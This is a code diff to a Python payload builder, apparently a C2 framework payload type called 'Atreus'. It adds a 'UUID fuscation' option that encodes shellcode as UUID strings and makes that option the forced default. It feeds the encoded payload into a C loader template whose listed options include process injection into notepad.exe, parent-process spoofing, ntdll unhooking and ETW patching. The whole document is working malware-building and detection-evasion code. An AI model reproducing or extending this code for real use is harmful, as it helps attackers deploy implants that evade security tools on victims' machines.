@@ -45,9 +45,9 @@ class Atreus(PayloadType):
         BuildParameter(
             name="encryption_type",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Payload encryption",
-            choices=["rc4", "xor", "none"],
-            default_value="rc4",
+            description="Payload encoding/encryption: uuid = UUID fuscation (low entropy, no key), rc4/xor = encrypted bytes, none = plaintext",
+            choices=["uuid", "rc4", "xor", "none"],
+            default_value="uuid",
         ),
         BuildParameter(
             name="encryption_key",
@@ -124,7 +124,7 @@ class Atreus(PayloadType):
             resp.error_message = "No payload received from Kratos builder"
             return resp
 
-        enc_type         = self.get_parameter("encryption_type") or "rc4"
+        enc_type = "uuid"  # forced
         enc_key_param    = (self.get_parameter("encryption_key") or "").strip()
         target_process   = (self.get_parameter("target_process") or "C:\\Windows\\System32\\notepad.exe").strip()
         ppid_spoof       = self.get_parameter("ppid_spoof") or False
@@ -136,24 +136,51 @@ class Atreus(PayloadType):
         wipe_memory      = self.get_parameter("wipe_memory") or False
         debug_mode       = self.get_parameter("debug_mode") or False
 
-        # Generate key
+        # Generate key (unused for uuid mode)
         key_bytes = enc_key_param.encode() if enc_key_param else \
                     bytes(random.getrandbits(8) for _ in range(16))
 
-        # Encrypt payload
-        if enc_type == "rc4":
+        # Encode/encrypt payload
+        orig_size = len(payload_bytes)
+        if enc_type == "uuid":
+            # Pad to multiple of 16
+            padded = payload_bytes
+            remainder = len(padded) % 16
+            if remainder:
+                padded = padded + bytes(16 - remainder)
+            uuid_strings = []
+            for i in range(0, len(padded), 16):
+                c = padded[i:i+16]
+                s = (f"{c[0]:02X}{c[1]:02X}{c[2]:02X}{c[3]:02X}-"
+                     f"{c[4]:02X}{c[5]:02X}-"
+                     f"{c[6]:02X}{c[7]:02X}-"
+                     f"{c[8]:02X}{c[9]:02X}-"
+                     f"{c[10]:02X}{c[11]:02X}{c[12]:02X}{c[13]:02X}{c[14]:02X}{c[15]:02X}")
+                uuid_strings.append(f'"{s}"')
+            payload_hex    = ", ".join(uuid_strings)
+            uuid_count     = str(len(uuid_strings))
+            payload_size   = str(orig_size)
+            rc4_key_bytes  = "0x00"
+            xor_key_bytes  = "0x00"
+        elif enc_type == "rc4":
             encrypted = _rc4(key_bytes, payload_bytes)
             payload_hex    = ", ".join(f"0x{b:02x}" for b in encrypted)
+            uuid_count     = "0"
+            payload_size   = str(orig_size)
             rc4_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
             xor_key_bytes  = "0x00"
         elif enc_type == "xor":
             encrypted = bytes(payload_bytes[i] ^ key_bytes[i % len(key_bytes)]
                               for i in range(len(payload_bytes)))
             payload_hex    = ", ".join(f"0x{b:02x}" for b in encrypted)
+            uuid_count     = "0"
+            payload_size   = str(orig_size)
             rc4_key_bytes  = "0x00"
             xor_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
         else:
             payload_hex    = ", ".join(f"0x{b:02x}" for b in payload_bytes)
+            uuid_count     = "0"
+            payload_size   = str(orig_size)
             rc4_key_bytes  = "0x00"
             xor_key_bytes  = "0x00"
 
@@ -168,13 +195,17 @@ class Atreus(PayloadType):
 
         src = template_path.read_text()
         src = src.replace("%PAYLOAD%",          payload_hex)
+        src = src.replace("%UUID_COUNT%",       uuid_count)
+        src = src.replace("%PAYLOAD_SIZE%",     payload_size)
         src = src.replace("%RC4_KEY%",          rc4_key_bytes)
         src = src.replace("%XOR_KEY_BYTES%",    xor_key_bytes)
         src = src.replace("%TARGET_PROCESS_W%", target_wchar)
 
         # Build defines
         defines = []
-        if enc_type == "rc4":
+        if enc_type == "uuid":
+            defines.append("-DUSE_UUID")
+        elif enc_type == "rc4":
             defines.append("-DUSE_RC4")
         elif enc_type == "xor":
             defines.append("-DUSE_XOR")
@@ -247,7 +278,7 @@ class Atreus(PayloadType):
                 resp.payload = f.read()
                 resp.status  = BuildStatus.Success
 
-                features = [enc_type.upper()]
+                features = [f"UUID-fuscation" if enc_type == "uuid" else enc_type.upper()]
                 if ppid_spoof:       features.append("PPID-spoof")
                 if use_unhook:       features.append("unhook-ntdll")
                 if use_etw_patch:    features.append("ETW-patch")
